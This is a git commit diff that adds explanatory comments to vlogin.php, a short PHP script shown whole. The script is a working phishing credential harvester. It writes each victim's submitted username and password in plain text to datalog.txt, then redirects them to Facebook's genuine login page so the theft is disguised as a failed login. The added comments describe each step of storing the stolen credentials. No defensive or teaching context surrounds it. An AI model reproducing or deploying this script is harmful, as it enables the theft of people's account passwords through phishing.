9755043e65de04ef5fdf0bd8dc207e67f6b8bf6e
Chathuranga Sineth <mcsineth@gmail.com>
2017-03-24 12:12:32 +0530

    Update vlogin.php

--- vlogin.php
+++ vlogin.php
@@ -1,22 +1,22 @@
 <?php
-
+// Here I'm get the User name and password  value to the $username and $password
 $username=$_POST["username"];
 $password=$_POST["password"];
 
 
 //echo "$username : " . $password;
 
-
+//Create a datalog.txt file for store the username and password if file cant open die
 $myfile = fopen("datalog.txt", "a") or die("unable to open file!");
 
-
+//Store values in this $txt variable name
 $txt="USERNAME=$username, PASSWORD=$password\n";
 
-
+// when we get the vales it will be write the datalog file
 fwrite($myfile, "\n".$txt);
 fclose($myfile);
 
-
+// after 
 header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");
 
 exit();
